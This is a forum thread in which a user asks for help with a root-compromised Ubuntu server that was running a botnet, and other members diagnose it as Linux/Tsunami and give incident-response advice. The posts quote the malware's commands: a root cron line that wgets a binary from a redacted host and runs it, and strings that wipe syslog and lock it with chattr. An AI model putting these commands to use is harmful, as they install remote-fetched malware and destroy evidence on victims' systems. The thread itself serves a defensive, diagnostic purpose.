---
title: "Server sending cron botnet ssh commands"
date: 2013-02-26
forum: Security
---

### Post by jzambon on 2013-02-26
I got a disconcerting from my sys admin this morning that someone has been running a botnet off of my Ubuntu installation last night for an hour.  I checked the /var/log/auth.log and see a lot of...

Feb 26 04:20:01 xxxx CRON[2640]: pam_unix(cron:session): session opened for user root by (uid=0)
Feb 26 04:20:02 xxxx CRON[2640]: pam_unix(cron:session): session closed for user root
Feb 26 04:21:01 xxxx CRON[2653]: pam_unix(cron:session): session opened for user root by (uid=0)
Feb 26 04:21:02 xxxx CRON[2653]: pam_unix(cron:session): session closed for user root
Feb 26 04:22:01 xxxx CRON[2667]: pam_unix(cron:session): session opened for user root by (uid=0)

The root crontab has the following added to it...
* * * * * /root/.rnd_ >/dev/null 2>&1
@weekly wget [http://xxxxxxxxxx.bot](http://xxxxxxxxxx.bot) -O /root/.rnd_;chmod +x /root/.rnd_;/root/.rnd_ >/dev/null 2>&1

At the times that the network admin says my server has been flooding traffic.

I've set the following in sshd_config:
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no

I've deleted the root account password (fairly sure I never enabled it):
sudo passwd -dl root

I've installed [denyhosts]("http://ubuntuforums.org/showthread.php?t=450853")

Also rather disconcerting, the permissions of my syslog have changed and the file is empty...
xxx@xxxx:~$ ls -lrth /var/log/syslog
---------- 1 root root 0 Feb 23 20:08 /var/log/syslog


This is a server used by a group of about 10 people or so, with very limited sudo access.  What other steps should I be taking?

I'm very close to considering backing up and reinstalling, I don't know how deep this compromise has gone, especially since syslog is empty.

Thanks.

---

### Post by unspawn on 2013-02-26
> **jzambon said:**
> Also rather disconcerting, the permissions of my syslog have changed and the file is empty...
Well that's just a side effect of what both the "a" and "b" binaries do. From running 'strings -an4' on "b":
```

rm -rf /var/log/syslog;touch /var/log/syslog;chmod 0000 /var/log/syslog;chattr +isa /var/log/syslog;
/tmp/cron
touch /tmp/cron
%s%s
 >/dev/null 2>&1
@weekly wget -q http://xxxxxxxxxx.bot -O /tmp/.a;chmod +x /tmp/.a;sh /tmp/.a >/dev/null 2>&1
crontab /tmp/cron;rm -rf /tmp/cron

```> **jzambon said:**
> This is a server used by a group of about 10 people or so, with very limited sudo access.  What other steps should I be taking?
While you can't be faulted for your after-the-fact reflexes ([CERT Intruder Detection Checklist]("http://web.archive.org/web/20080109214340/http://www.cert.org/tech_tips/intruder_detection_checklist.html&quot;")) your first step should have been to 0) gather nfo (users, processes, network, file system integrity), 1) mitigate the situation by raising the firewall and stopping any service that isn't vital for accessing / managing the machine (at, cron, web server, database, etc, etc) basically every networked service except SSH and 2) informing users about this compromise advising them to change all pass phrases / passwords used on or from this machine. 


> **jzambon said:**
> I'm very close to considering backing up and reinstalling, I don't know how deep this compromise has gone, especially since syslog is empty.
A perp managed to run processes as root. This means you're dealing with a root compromise and there is no "easy way out". Installing from scratch will only be effective if you harden the machine properly as you rebuild it. This means you start with a machine from the ground up, no web server, no database, not exposing any networked services while you secure the basis. In case you think of restoring a backup: consider all your pass phrases and passwords siphoned off the system and all your backups, configuration and applications tainted unless you are able to verify integrity independently, autonomously. Login records, processes, network data, foreign objects in users homes or temporary directories or the docment root, users shell history, (any remaining) system and daemon log files should be saved off-site before you proceed because whichever approach you choose it is vital you learn how the perp got in.

---

### Post by sandyd on 2013-02-26
You have been infected with Linux/Tsunami

see [http://www.virusradar.com/en/Linux_Tsunami.B/description](http://www.virusradar.com/en/Linux_Tsunami.B/description)

Also, please do not post links to botnets, even in the security forums.

Thanks

---

### Post by unspawn on 2013-02-26
> **sandyd said:**
> You have been infected with Linux/Tsunami
With all due respect please be more clear. What should the OP do about that and how?

---

